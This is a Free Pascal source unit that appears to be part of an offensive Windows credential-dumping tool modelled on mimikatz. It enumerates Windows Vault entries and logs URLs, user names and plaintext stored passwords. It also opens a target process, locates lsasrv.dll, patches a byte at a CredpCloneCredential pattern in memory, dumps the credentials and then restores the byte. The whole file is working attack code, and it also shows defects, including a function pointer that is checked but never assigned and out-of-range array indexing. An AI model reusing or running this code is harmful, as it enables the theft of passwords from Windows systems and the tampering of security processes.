unit uvaults;

{$mode delphi}

interface

{
$VaultSchema = @{
        ([Guid] '2F1A6504-0641-44CF-8BB5-3612D865F2E5') = 'Windows Secure Note'
        ([Guid] '3CCD5499-87A8-4B10-A215-608888DD3B55') = 'Windows Web Password Credential'
        ([Guid] '154E23D0-C644-4E6F-8CE6-5069272F999F') = 'Windows Credential Picker Protector'
        ([Guid] '4BF4C442-9B8A-41A0-B380-DD4A704DDB28') = 'Web Credentials'
        ([Guid] '77BC582B-F0A6-4E15-4E80-61736B6F3B29') = 'Windows Credentials'
        ([Guid] 'E69D7838-91B5-4FC9-89D5-230D4D4CC2BC') = 'Windows Domain Certificate Credential'
        ([Guid] '3E0E35BE-1B77-43E7-B873-AED901B6275B') = 'Windows Domain Password Credential'
        ([Guid] '3C886FF3-2669-4AA2-A8FB-3F6759A77548') = 'Windows Extended Credential'
        ([Guid] '00000000-0000-0000-0000-000000000000') = $null
}

uses
  Classes, SysUtils,windows,utils,upsapi,umemory;

type VAULT_SCHEMA_ELEMENT_ID =(
    ElementId_Illegal = $0,
    ElementId_Resource = $1,
    ElementId_Identity = $2,
    ElementId_Authenticator = $3,
    ElementId_Tag = $4,
    ElementId_PackageSid = $5,
    ElementId_AppStart = $64,
    ElementId_AppEnd = $2710);

Type VAULT_ELEMENT_TYPE =(
    ElementType_Undefined = $ffffffff,
    ElementType_Boolean = $0,
    ElementType_Short = $1,
    ElementType_UnsignedShort = $2,
    ElementType_Integer = $3,
    ElementType_UnsignedInteger = $4,
    ElementType_Double = $5,
    ElementType_Guid = $6,
    ElementType_String = $7,
    ElementType_ByteArray = $8,
    ElementType_TimeStamp = $9,
    ElementType_ProtectedArray = $a,
    ElementType_Attribute = $b,
    ElementType_Sid = $c,
    ElementType_Last = $d );

{
Type _VAULT_VARIANT=record
 veType : VAULT_ELEMENT_TYPE;
 Unk1 : dword;
 data : pointer;
End;
}


//see _VAULT_ITEM_DATA  in https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_vault.h
Type _VAULT_ITEM_ELEMENT=record  //similar to _VAULT_ITEM_DATA
 SchemaElementId : VAULT_SCHEMA_ELEMENT_ID;
 Unk0 : dword;
 //ItemValue : _VAULT_VARIANT
 veType : VAULT_ELEMENT_TYPE;
 Unk1 : dword;
 data : pointer;
End;

type _VAULT_BYTE_BUFFER =record
	 Length:DWORD;
	 Value:PBYTE;
        end;
PVAULT_BYTE_BUFFER=^_VAULT_BYTE_BUFFER;



type _VAULT_ITEM_8 =record
	 SchemaId:GUID;
	 FriendlyName:pointer; //PWSTR;
	 Ressource:pointer; //or pointer
	 Identity:pointer; //PVAULT_ITEM_DATA;
	 Authenticator:pointer; //PVAULT_ITEM_DATA;
	 PackageSid:pointer; //PVAULT_ITEM_DATA;
	 LastWritten:FILETIME;
	 Flags:DWORD;
	 cbProperties:DWORD;
	 Properties:pointer; //PVAULT_ITEM_DATA;
end;
PVAULT_ITEM_8=^_VAULT_ITEM_8;

var
VAULTENUMERATEVAULTS:function ( unk0:DWORD; cbVault:PDWORD; out vaultguids:LPGUID):ntstatus;stdcall;
VAULTFREE:function (memory:pvoid):ntstatus;
//guid or lpguid will both work
VAULTOPENVAULT:function (vaultGUID:lpguid; unk0:dword; out vault:phandle):ntstatus;stdcall;
VAULTCLOSEVAULT:function (vault:PHANDLE):ntstatus;stdcall;
//VAULTGETINFORMATION:function ( vault:handle; unk0:dword;  informations:pointer{PVAULT_INFORMATION}):ntstatus;stdcall;
VAULTENUMERATEITEMS:function (vault:phandle; unk0:dword;  cbItems:PDWORD; out items:PVOID):ntstatus;stdcall;
//VAULTENUMERATEITEMTYPES:function (vault:handle; unk0:dword; cbItemTypes:PDWORD;itemTypes:PVAULT_ITEM_TYPE):ntstatus;stdcall;
VAULTGETITEM7:function (vault:phandle; SchemaId:GUID; Resource:pointer{PVAULT_ITEM_DATA};Identity:pointer{PVAULT_ITEM_DATA}; hWnd:hwnd;  Flags:dword;  out pItem:pointer {PVAULT_ITEM_7}):ntstatus;stdcall;
{private static extern uint VaultGetItem8(IntPtr pVaultHandle, IntPtr pSchemaId, IntPtr pResource, IntPtr pIdentity, IntPtr pPackageSid, IntPtr hwndOwner, uint dwFlags, out IntPtr ppItems);}
VAULTGETITEM8:function (vault:phandle; SchemaId:pointer{pointer/GUID}; Resource:pointer{PVAULT_ITEM_DATA};Identity:pointer{PVAULT_ITEM_DATA}; PackageSid:pointer{PVAULT_ITEM_DATA}; hWnd:pointer{hwnd};  Flags:dword;  out pItem:pointer {pointer/PVAULT_ITEM_8}):ntstatus;stdcall;

function Init:boolean;
function enum:boolean;
function patch(pid:dword):boolean;

implementation




function Init:boolean;
var
  hVaultLib:thandle;
  bStatus:boolean = FALSE;
begin

    hVaultLib := LoadLibrary('vaultcli.dll');

    if (hVaultLib > 0) then
    begin
        @VaultEnumerateItems := GetProcAddress(hVaultLib, 'VaultEnumerateItems');
        @VaultEnumerateVaults := GetProcAddress(hVaultLib, 'VaultEnumerateVaults');
        @VaultFree := GetProcAddress(hVaultLib, 'VaultFree');
        //@VAULTGETITEM7 := GetProcAddress(hVaultLib, 'VaultGetItem');
        @VAULTGETITEM8 := GetProcAddress(hVaultLib, 'VaultGetItem');
        @VaultOpenVault := GetProcAddress(hVaultLib, 'VaultOpenVault');
        @VaultCloseVault := GetProcAddress(hVaultLib, 'VaultCloseVault');

        bStatus := (@VaultEnumerateVaults <> nil)
            and (@VaultFree <> nil)
            and (@VAULTGETITEM7 <> nil)
            and (@VAULTGETITEM8 <> nil)
            and (@VaultOpenVault <> nil)
            and (@VaultCloseVault <> nil)
            and (@VaultEnumerateItems <> nil);
    end;

    result:= bStatus;
    if result=false then log('vault init=false');
end;

//check against vaultcmd

function enum:boolean;
var
  i,j,cbvaults,cbItems:dword;
  //vaults:array [0..254] of lpguid;
  status:NTStatus;
  //hvault:handle;
  hvault:phandle;
  //items:array[0..254] of pvoid;
  pvaults,pitems,ptr,ptr2:pointer;
  pitem8:pointer ;
  //vi:_VAULT_ITEM_8;
  VIE:_VAULT_ITEM_ELEMENT;
begin
    result:=false;
    //fillchar(vaults,sizeof(vaults),0);
    //status := VaultEnumerateVaults(0, @cbVaults, @vaults[0]);
    pvaults:=nil;
    status := VaultEnumerateVaults(0, @cbVaults, pvaults);
		if(status = 0) then
                begin
                ptr:=pvaults;
                log('VaultEnumerateVaults OK, '+inttostr(cbvaults));
                for i:= 0 to cbVaults-1 do
                    begin
                    log('*************************************************');
                    log('item:'+inttostr(i)+ ' GUID:'+GUIDToString ( tguid(ptr^)));
                    begin
                    //if VaultOpenVault(vaults[i]^, 0, @hVault)=0 then
                    if VaultOpenVault(@tguid(ptr^), 0, hVault)=0 then
                       begin
                       log('VaultOpenVault OK');
                       //if VaultEnumerateItems(hVault, $200, @cbItems, @items[0])=0 then
                       pitems:=nil;
                       if VaultEnumerateItems(hVault, $200, @cbItems, pitems)=0 then
                          begin
                          log('VaultEnumerateItems OK, '+inttostr(cbitems));
                          ptr2:=pitems;
                          for j:=0 to cbItems -1 do
                              begin
                              log('SchemaId:'+GUIDToString (PVAULT_ITEM_8(ptr2).SchemaId ) );
                              //log('cbProperties:'+inttostr(PVAULT_ITEM_8(ptr2).cbProperties)) ;
                              log(inttostr(j)+' FriendlyName:'+pwidechar(PVAULT_ITEM_8(ptr2).FriendlyName) );
                              CopyMemory (@vie,PVAULT_ITEM_8(ptr2).Ressource ,sizeof(vie));
                              log('URL:'+pwidechar(vie.data));
                              CopyMemory (@vie,PVAULT_ITEM_8(ptr2).Identity  ,sizeof(vie));
                              log('User:'+pwidechar(vie.data));
                              pitem8 :=nil;
                              status:= VaultGetItem8(hVault, pointer(@PVAULT_ITEM_8(ptr2).SchemaId), PVAULT_ITEM_8(ptr2).Ressource, PVAULT_ITEM_8(ptr2).Identity, PVAULT_ITEM_8(ptr2).PackageSid,0, 0, pitem8 );
                              if status=0 then
                                 begin
                                     result:=true;
                                     log('GetItemW8 OK');
                                     CopyMemory (@vie,PVAULT_ITEM_8(pItem8).Authenticator  ,sizeof(vie));
                                     if vie.veType=ElementType_String then
                                           begin
                                           log('Authenticator:'+pwidechar(vie.data));
                                           end;
                                    //log('veType:'+inttostr(integer(vie.ItemValue.veType)));
                                    if vie.veType=ElementType_ByteArray then
                                           begin
                                           //CopyMemory (@vie,PVAULT_ITEM_8(pItem8).Authenticator  ,sizeof(vie));
                                           log('data:'+inttostr(nativeuint(vie.data)));
                                           end;
                                    VaultFree(pItem8);
                                    end
                                    else log('GetItemW8 NOT OK, '+inttostr(status));

                              inc(ptr2,sizeof(_VAULT_ITEM_8));
                              end; //for j

                          VaultFree(pitems);
                          end; //VaultEnumerateItems
                       VaultCloseVault(hVault);
                       end//VaultOpenVault
                       else log('VaultOpenVault NOT OK, '+inttostr(getlasterror));
                    end; //if nativeuint(vaults[i])<>0 then
                    inc(ptr,sizeof(tguid));
                    end; //for i
                VaultFree(pvaults);
                end //VaultEnumerateVaults
                else log('VaultEnumerateVaults NOT OK')

end;

function Init_Pattern:tbytes;
const
  PTRN_WN63_CredpCloneCredential:array [0..5] of byte =($45, $8b, $f8, $44, $23, $fa);
var
  pattern:array of byte;
begin

  if LowerCase (osarch )='amd64' then
     begin
     setlength(pattern,length(PTRN_WN63_CredpCloneCredential));
     CopyMemory (@pattern[0],@PTRN_WN63_CredpCloneCredential[0],length(PTRN_WN63_CredpCloneCredential));
     end
     else
     begin
     //
     end;
result:=pattern;
end;


function patch(pid:dword):boolean;
const
//offset x64
//offset x86
  after:array[0..0] of byte=($eb);
  //after:array[0..1] of byte=($0F,$84);
var
  dummy:string;
  hprocess,hmod:thandle;
  hmods:array[0..1023] of thandle;
  MODINFO:  MODULEINFO;
  cbNeeded,count:	 DWORD;
  szModName:array[0..254] of char;
  addr:pointer;
  backup:array[0..0] of byte;
  read:cardinal;
  offset:nativeint=0;
  patch_pos:ShortInt=0;
  pattern:tbytes;
begin
  result:=false;
  if pid=0 then exit;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     //nothing needed here
     end;
  if (lowercase(osarch)='x86') then
     begin
     //nothing needed here
     end;
  {
  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  }
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);
       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
       cbneeded:=0;
       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
               begin
               log('EnumProcessModules OK',0);

               for count:=0 to cbneeded div sizeof(thandle) do
                   begin
                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
                      begin
                      dummy:=lowercase(strpas(szModName ));
                      //writeln(dummy); //debug
                      if pos('lsasrv.dll',dummy)>0 then
                         begin
                         log('lsasrv.dll found:'+inttohex(hMods[count],8),0);
                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
                            begin
                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
                            addr:=MODINFO.lpBaseOfDll;
                            pattern:=Init_Pattern ;
                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
                            log('Searching...',0);
                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
                            log('Done!',0);
                            if offset<>0 then
                                 begin
                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
                                 //if ReadProcessMemory( hprocess,pointer(offset+patch_pos),@backup[0],2,@read) then
                                 if ReadMem  (hprocess,offset+patch_pos,backup) then
                                   begin
                                   log('ReadProcessMemory OK '+leftpad(inttohex(backup[0],1),2)+leftpad(inttohex(backup[1],1),2),0);
                                   if WriteMem(hprocess,offset+patch_pos,after)=true then
                                        begin
                                        log('patch ok',0);
                                        try
                                        log('***************************************',0);
                                        if enum //do something
                                           then begin log('SamQueryInformationUser OK',0);result:=true;end
                                           else log('SamQueryInformationUser NOT OK',1);
                                        log('***************************************',0);
                                        finally //we really do want to patch back
                                        if WriteMem(hprocess,offset+patch_pos,backup)=true then log('patch ok') else log('patch failed');
                                        //should we read and compare before/after?
                                        end;
                                        end
                                        else log('patch failed',1);
                                   end;
                                 end;
                            {//test - lets read first 4 bytes of our module
                             //can be verified with process hacker
                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                               begin
                               log('ReadProcessMemory OK');
                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                               end;
                            }
                            end;//if GetModuleInformation...
                         break; //no need to search other modules...
                         end; //if pos('samsrv.dll',dummy)>0 then
                      end; //if GetModuleFileNameExA
                   end; //for count:=0...
               end; //if EnumProcessModules...
       closehandle(hprocess);
       end;//if openprocess...

end;

end.

